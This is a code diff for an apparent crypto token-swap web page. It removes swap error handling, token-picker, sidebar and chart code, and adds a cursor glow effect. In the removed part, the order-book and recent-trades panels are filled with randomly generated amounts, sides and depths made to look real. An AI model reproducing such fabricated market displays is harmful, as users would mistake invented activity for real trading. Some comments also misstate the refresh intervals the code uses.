-      showSwapStatus('❌ Transaction failed. Check BscScan for details.', 'error');
-    }
-
-  } catch (err) {
-    console.error('Swap execution runtime error:', err);
-    if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
-      showSwapStatus('Swap cancelled by user.', 'error');
-    } else if (err.message?.includes('INSUFFICIENT_OUTPUT_AMOUNT')) {
-      showSwapStatus('Slippage too low — increase slippage tolerance and try again.', 'error');
-    } else if (err.message?.includes('INSUFFICIENT_LIQUIDITY')) {
-      showSwapStatus(`Not enough liquidity for ${selectedToken.sym} → ${toToken.sym}.`, 'error');
-    } else if (err.message?.includes('execution reverted')) {
-      showSwapStatus('Swap reverted — try increasing slippage or a smaller amount.', 'error');
-    } else {
-      showSwapStatus('Swap failed: ' + (err.reason || err.shortMessage || err.message || 'Unknown error'), 'error');
-    }
-  }
-}
-
-      // ── Swap status ──
-      function showSwapStatus(msg, type) {
-        let el = document.getElementById('swapStatusMsg');
-        if (!el) {
-          el = document.createElement('div');
-          el.id = 'swapStatusMsg';
-          el.style.cssText = `margin-top:10px;padding:10px 14px;border-radius:6px;font-family:var(--font-mono);font-size:0.74rem;text-align:center;transition:all 0.3s;`;
-          document.querySelector('.btn-swap').after(el);
-        }
-        const styles = {
-          pending: `background:rgba(243,186,47,0.1);border:1px solid rgba(243,186,47,0.3);color:#f3ba2f;`,
-          success: `background:rgba(0,255,127,0.1);border:1px solid var(--border);color:var(--green);`,
-          error:   `background:rgba(255,77,77,0.1);border:1px solid rgba(255,77,77,0.25);color:var(--red);`,
-        };
-        el.style.cssText += styles[type] || styles.pending;
-        el.textContent = msg;
-        el.style.display = 'block';
-        if (type === 'error') setTimeout(clearSwapStatus, 5000);
-      }
-      function clearSwapStatus() { const el = document.getElementById('swapStatusMsg'); if (el) el.style.display = 'none'; }
-      // ═══ ORDER BOOK ═══
-function renderOrderBook(price) {
-  if (!price) return;
-
-  // Helper to get realistic amounts based on token price
-  const getRealisticAmount = (p) => {
-    const randomUSD = Math.random() * (5000 - 100) + 100;
-    const rawAmount = randomUSD / p;
-    return rawAmount > 1000 ? Math.floor(rawAmount).toLocaleString() : rawAmount.toFixed(4);
-  };
-
-  let asks = '', bids = '';
-
-  // ASKS
-  for (let i = 5; i > 0; i--) {
-    const p = price * (1 + i * 0.0008 * (Math.random() * 0.5 + 0.75));
-    
-    // Realistic scaling applied here
-    const amtLabel = getRealisticAmount(p); 
-    const amtNumeric = parseFloat(amtLabel.replace(/,/g, ''));
-    const total = (p * amtNumeric).toFixed(2);
-    
-    const pct = Math.random() * 80 + 10;
-    asks += `<div class="ob-row ask"><span class="ob-price">${fmtPrice(
-      p
-    )}</span><span style="color:var(--text)">${amtLabel}</span><span>${total}</span><div class="ob-bar" style="width:${pct}%"></div></div>`;
-  }
-
-  // BIDS
-  for (let i = 1; i <= 5; i++) {
-    const p = price * (1 - i * 0.0008 * (Math.random() * 0.5 + 0.75));
-    
-    // Realistic scaling applied here
-    const amtLabel = getRealisticAmount(p);
-    const amtNumeric = parseFloat(amtLabel.replace(/,/g, ''));
-    const total = (p * amtNumeric).toFixed(2);
-    
-    const pct = Math.random() * 80 + 10;
-    bids += `<div class="ob-row bid"><span class="ob-price">${fmtPrice(
-      p
-    )}</span><span style="color:var(--text)">${amtLabel}</span><span>${total}</span><div class="ob-bar" style="width:${pct}%;right:0"></div></div>`;
-  }
-
-  document.getElementById('obAsks').innerHTML = asks;
-  document.getElementById('obBids').innerHTML = bids;
-  document.getElementById('obSpread').textContent = fmtPrice(
-    price * 0.003
-  );
-}
-
-      // ═══ RECENT TRADES ═══
-function renderRecentTrades(price) {
-  if (!price) return;
-
-  // Helper to get realistic amounts based on token price ($100 - $5000 range)
-  const getRealisticAmount = (p) => {
-    const randomUSD = Math.random() * (5000 - 100) + 100;
-    const rawAmount = randomUSD / p;
-    // Show whole numbers for high-supply tokens (SHIB), decimals for others
-    return rawAmount > 1000 ? Math.floor(rawAmount).toLocaleString() : rawAmount.toFixed(4);
-  };
-
-  let html = '';
-  const now = new Date();
-
-  for (let i = 0; i < 12; i++) {
-    const isBuy = Math.random() > 0.48;
-    // Slight price variance for history
-    const p = price * (1 + (Math.random() - 0.5) * 0.002);
-    
-    // Plugged in realistic scaling
-    const amtLabel = getRealisticAmount(p);
-    
-    const t = new Date(now - i * 13000);
-    const time =
-      t.getHours().toString().padStart(2, '0') +
-      ':' +
-      t.getMinutes().toString().padStart(2, '0') +
-      ':' +
-      t.getSeconds().toString().padStart(2, '0');
-
-    html += `<div class="rt-row">
-      <span class="${isBuy ? 'pos' : 'neg'}">${fmtPrice(p)}</span>
-      <span style="color:var(--text)">${amtLabel}</span>
-      <span style="color:var(--text-dim)">${time}</span>
-      <span class="${isBuy ? 'pos' : 'neg'}">${isBuy ? 'Buy' : 'Sell'}</span>
-    </div>`;
-  }
-  
-  document.getElementById('recentTradesList').innerHTML = html;
-}
-
-      // ═══ TOKEN MODAL ═══
-      function openTokenModal(target) {
-        modalTarget = target;
-        document.getElementById('tokenModal').style.display = 'flex';
-        document.getElementById('modaltokensearch').value = '';
-        renderModalTokens(TOKENS);
-        setTimeout(
-          () => document.getElementById('modaltokensearch').focus(),
-          80
-        );
-      }
-      function closeTokenModal() {
-        document.getElementById('tokenModal').style.display = 'none';
-      }
-      function filterTokens() {
-        const q = document
-          .getElementById('modaltokensearch')
-          .value.toLowerCase();
-        renderModalTokens(
-          TOKENS.filter(
-            (t) =>
-              t.sym.toLowerCase().includes(q) ||
-              (t.name && t.name.toLowerCase().includes(q))
-          )
-        );
-      }
-      function renderModalTokens(list) {
-        const el = document.getElementById('modalTokenList');
-        if (!el) return;
-        el.innerHTML = list
-          .map((t) => {
-            const bal =
-              walletAddress && walletBalances[t.sym] != null
-                ? `<div style="font-size:0.65rem;color:var(--green);margin-top:1px;">${fmtBal(
-                    walletBalances[t.sym]
-                  )} ${t.sym}</div>`
-                : '';
-            return `
-            <div class="modal-token-row" onclick="pickToken('${t.sym}')">
-              <div style="display:flex;align-items:center;gap:12px;">
-                <img src="${
-                  t.icon
-                }" style="width:28px;height:28px;border-radius:50%;object-fit:contain;flex-shrink:0;" onerror="this.style.display='none'">
-                <div>
-                  <div style="font-weight:700;color:#fff;">${t.sym}</div>
-                  <div style="font-size:0.73rem;color:#888;">${
-                    t.name || ''
-                  }</div>
-                  ${bal}
-                </div>
-              </div>
-              <div style="text-align:right;font-family:var(--font-mono);">
-                <div style="font-size:0.8rem;color:#ccc;">${fmtPrice(
-                  t.price
-                )}</div>
-                <div style="font-size:0.68rem;" class="${
-                  t.change >= 0 ? 'pos' : 'neg'
-                }">${t.change >= 0 ? '+' : ''}${(t.change || 0).toFixed(
-              2
-            )}%</div>
-              </div>
-            </div>`;
-          })
-          .join('');
-      }
-      function pickToken(sym) {
-        const tok = TOKENS.find((t) => t.sym === sym);
-        if (!tok) return;
-        if (modalTarget === 'from') {
-          selectedToken = tok;
-          setFromIcon(tok);
-          document.getElementById('fromSym').textContent = tok.sym;
-          if (tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
-          renderSidebar(document.getElementById('sidebarSearch').value);
-        } else {
-          toToken = tok;
-          setToIcon(tok);
-          document.getElementById('toSym').textContent = tok.sym;
-        }
-        updateSwapBalanceDisplays();
-        calcSwap();
-        closeTokenModal();
-      }
-      document
-        .getElementById('tokenModal')
-        .addEventListener('click', function (e) {
-          if (e.target === this) closeTokenModal();
-        });
-
-      // ═══ SIDEBAR TOGGLE ═══
-      function isMobile() {
-        return window.innerWidth <= 900;
-      }
-
-      function toggleSidebar() {
-        if (isMobile()) {
-          const sidebar = document.getElementById('appSidebar');
-          const btn = document.getElementById('sidebarToggle');
-          const backdrop = document.getElementById('sidebarBackdrop');
-          const isOpen = sidebar.classList.toggle('mobile-open');
-          btn.classList.toggle('mobile-open', isOpen);
-          backdrop.classList.toggle('show', isOpen);
-        } else {
-          const sidebar = document.getElementById('appSidebar');
-          const btn = document.getElementById('sidebarToggle');
-          const isCollapsed = sidebar.classList.toggle('collapsed');
-          btn.classList.toggle('collapsed', isCollapsed);
-          btn.style.left = isCollapsed ? '0px' : 'var(--sidebar-w)';
-        }
-      }
-      function closeSidebarMobile() {
-        document.getElementById('appSidebar').classList.remove('mobile-open');
-        document
-          .getElementById('sidebarToggle')
-          .classList.remove('mobile-open');
-        document.getElementById('sidebarBackdrop').classList.remove('show');
-      }
-
-      // ═══ TABS / SLIPPAGE ═══
-      function setSwapTab(btn) {
-        document
-          .querySelectorAll('.swap-tab')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-      }
-      function setSlip(btn) {
-        document
-          .querySelectorAll('.slip-btn')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-        document.getElementById('slipCustom').value = '';
-      }
-
-      // ═══ LAUNCH / BACK ═══
-      function launchApp() {
-        document.getElementById('landing').style.display = 'none';
-        document.getElementById('app').classList.add('visible');
-        // Render default icons for ETH/USDT pair
-        setFromIcon(selectedToken);
-        setToIcon(toToken);
-        updateSwapBalanceDisplays();
-        calcSwap();
-        // Fetch live prices immediately, then every 45s
-        fetchPrices();
-        setInterval(fetchPrices, 1000);
-        // Refresh order book + trades every 6s
-        setInterval(() => {
-          if (selectedToken.price) {
-            renderOrderBook(selectedToken.price);
-            renderRecentTrades(selectedToken.price);
-          }
-        }, 10000);
-      }
-      function backToLanding() {
-        document.getElementById('app').classList.remove('visible');
-        document.getElementById('landing').style.display = 'flex';
-      }
-
-      // ═══ HELPERS ═══
-      function fmtPrice(n) {
-        if (!n || isNaN(n)) return '$0.00';
-        if (n >= 1000)
-          return (
-            '$' + n.toLocaleString(undefined, { maximumFractionDigits: 2 })
-          );
-        if (n >= 1) return '$' + n.toFixed(4);
-        return '$' + n.toFixed(6);
-      }
-      function fmtLarge(n) {
-        if (n >= 1e12) return (n / 1e12).toFixed(2) + 'T';
-        if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B';
-        if (n >= 1e6) return (n / 1e6).toFixed(2) + 'M';
-        return n.toFixed(0);
-      }
-    </script>
-
-    <script
-      type="text/javascript"
-      src="https://s3.tradingview.com/tv.js"
-    ></script>
-    <script src="chart.js"></script>
-    <script>
-      window.addEventListener('DOMContentLoaded', () => {
-        if (typeof initTradingViewChart === 'function')
-          initTradingViewChart('tradingview_dex_chart');
-      });
-      function updateTradingViewChart(symbol) {
-        const container = document.getElementById('tradingview_dex_chart');
-        if (!container) return;
-        container.innerHTML = '';
-        new TradingView.widget({
-          autosize: true,
-          symbol: symbol,
-          interval: 'H',
-          timezone: 'Etc/UTC',
-          theme: 'dark',
-          style: '1',
-          locale: 'en',
-          toolbar_bg: '#111712',
-          enable_publishing: false,
-          hide_side_toolbar: false,
-          allow_symbol_change: true,
-          container_id: 'tradingview_dex_chart',
-        });
-      }
- // ═══ LANDING MOBILE MENU ═══
- function toggleLandingMenu() {
-        const hb = document.getElementById('landingHamburger');
-        const dd = document.getElementById('landingNavDropdown');
-        hb.classList.toggle('open');
-        dd.classList.toggle('open');
-      }
-      function closeLandingMenu() {
-        document.getElementById('landingHamburger').classList.remove('open');
-        document.getElementById('landingNavDropdown').classList.remove('open');
-      }
-
-      // ═══ APP MOBILE MENU ═══
-      function toggleAppMenu() {
-        const hb = document.getElementById('appHamburger');
-        const dd = document.getElementById('appNavDropdown');
-        const header = document.querySelector('.app-header');
-        dd.style.top = header.getBoundingClientRect().bottom + 'px';
-        hb.classList.toggle('open');
-        dd.classList.toggle('open');
-      }
-      function closeAppMenu() {
-        document.getElementById('appHamburger').classList.remove('open');
-        document.getElementById('appNavDropdown').classList.remove('open');
-      }
-    </script>
-  </body>
+    const glow = document.createElement('div');
+    glow.style.cssText = `position:fixed; width:400px; height:400px; border-radius:50%; background: radial-gradient(circle, rgba(0,255,127,0.05) 0%, transparent 70%); pointer-events:none; z-index:2; transform:translate(-50%,-50%); will-change: left, top;`;
+    document.body.appendChild(glow);
+    document.addEventListener('mousemove', e => {
+      glow.style.left = e.clientX + 'px';
+      glow.style.top = e.clientY + 'px';
+    });
+  </script>
+</body>
 </html>
